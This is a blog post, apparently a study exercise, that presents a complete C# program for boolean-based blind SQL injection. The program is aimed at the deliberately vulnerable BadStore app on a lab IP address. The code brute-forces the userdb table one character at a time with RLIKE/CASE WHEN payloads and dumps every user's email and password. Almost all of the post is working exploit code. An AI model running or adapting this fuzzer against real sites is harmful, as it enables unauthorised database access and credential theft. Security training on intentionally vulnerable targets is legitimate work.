---
title: Creating a Blind/Boolean based mutational fuzzer to dump the database.
date: 2021-06-12 11:45:47 +07:00
categories: greyhatcch2
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Creating a Blind/Boolean based mutational fuzzer to dump the database.
---

## This Program is a Boolean-Based Blind mutational fuzzer that will use true/false questions in order to glean information 1 byte at a time.

_This exploit is more complicated than the UNION based sql fuzzer and requires much more time to retrieve the data._

- We use the:
  > RLIKE function to match values with a regular expression which can be used like an 'if-else' statement for true/false queries.
  
  > Couple "CASE WHEN" statements in the RLIKE function for the 'if-else' functionality.
  
  > COUNT(\*) function to return an integer for the number of rows in a table.
  
  > MID() function returns a particular substring depending on the starting index and length to return.
  
  > ORD() function converts a given input into an integer equivalent for matching data.

- The "GetString()" method from the "Encoding.ASCII" class to convert the array of bytes returned into a human readable string.



### Code block:

```Csharp
using System;
using System.Net;
using System.Reflection;
using System.IO;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Text;

namespace Boolean_Blind_Sql_Injection
{
    class Program
    {
        static void Main(string[] args)
        {
            // Asks server for length of no of rows in userdb table
            int countLength = 1;
            for (; ; countLength++)
            {
                string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR), NULL)) FROM";
                getCountLength += " userdb)=" + countLength + ") THEN 0x28 ELSE 0x41 END))";
                getCountLength += " AND '";

                string response = MakeRequest(getCountLength);
                if (response.Contains("parentheses not balanced"))
                    break;
            }

            // Asks server for no of rows in userdb table
            List<byte> countBytes = new List<byte>();
            for (int i = 1; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getCount += " IFNULL(CAST(COUNT(*) AS CHAR), NULL) FROM userdb),";
                    getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
                    string response = MakeRequest(getCount);

                    if (response.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }
            // Converts and prints no of rows
            int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            Console.WriteLine("[+] No of rows in userdb: " + count);



            // Calling methods and printing values
            for (int row = 0; row < count; row++)
            {
                foreach (string column in new string[] { "email", "passwd" })
                {
                    Console.WriteLine("[!] Getting length of query value...");
                    int valLength = GetLength(row, column);
                    Console.WriteLine(valLength);

                    Console.WriteLine("[!] Getting value...");
                    string value = GetValue(row, column, valLength);
                    Console.WriteLine(value);
                }

            }

        }

        // Makes request and returns response
        private static string MakeRequest(string payload)
        {
            string url = "http://192.168.216.128/cgi-bin/badstore.cgi?action=search&searchquery=";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);

            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            return response;
        }

        
        // Ask server for actual length of the value
        private static int GetLength(int row, string column)
        {
            // Retrieves length
            int countLength = 0;
            for (; ; countLength++)
            {
                string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
                getCountLength += " CHAR),NULL)) FROM userdb ORDER BY email LIMIT ";
                getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND";
                getCountLength += " 'TiT'='TiT";
                string response = MakeRequest(getCountLength);

                if (response.Contains("parentheses not balanced"))
                    break;
             }

            // Retrieve length actual val
            List<byte> countBytes = new List<byte>();
            for (int i = 0; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    // Changed it to a single string as it was easier to debug
                    string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),NULL) FROM userdb ORDER BY email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'TIT'='TIT";

                    string resp = MakeRequest(getLength);
                    if (resp.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }                      
                }                    
            }
            if (countBytes.Count > 0)
                return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            else
                return 0;  
        }

        // Ask server and retrieve a given value
        private static string GetValue(int row, string column, int length)
        {
            List<byte> valBytes = new List<byte>();
            for (int i = 0; i <= length; i++)
            {
                for (int c = 32; c <= 126; c++)
                {
                    string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(" + column + " AS CHAR),NULL) FROM userdb ORDER BY email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'TIT'='TIT";

                    string response = MakeRequest(getChar);
                    if (response.Contains("parentheses not balanced"))
                    {
                        valBytes.Add((byte)c);
                        break;
                    }
                }
            }
                return Encoding.ASCII.GetString(valBytes.ToArray());

        }
    }
}

```

### Output:

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/csharp/greyhatc/Ch2/Boolean_blind_sql_fuzzer/boolean_blind_sql_fuzzer.png)
